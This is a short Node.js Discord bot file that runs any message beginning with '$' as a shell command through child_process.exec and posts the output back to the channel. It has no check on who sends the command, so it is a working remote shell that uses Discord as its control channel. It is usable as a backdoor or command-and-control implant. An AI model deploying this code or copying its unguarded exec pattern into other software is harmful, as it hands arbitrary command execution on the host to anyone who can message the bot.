'use strict';

const { exec } = require("child_process");
const Discord = require('discord.js');
const BOT_TOKEN = ``;
const client = new Discord.Client();
const prefix = '$';


client.once('ready', () => {
	console.log('Bot is ready!');
});
    
client.on('message', message => {

    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const command = message.content.slice(prefix.length);

    exec(`${command}`, (error, stdout, stderr) => {
        message.reply(`\n ${stdout}`);
    });
});

client.login(BOT_TOKEN);

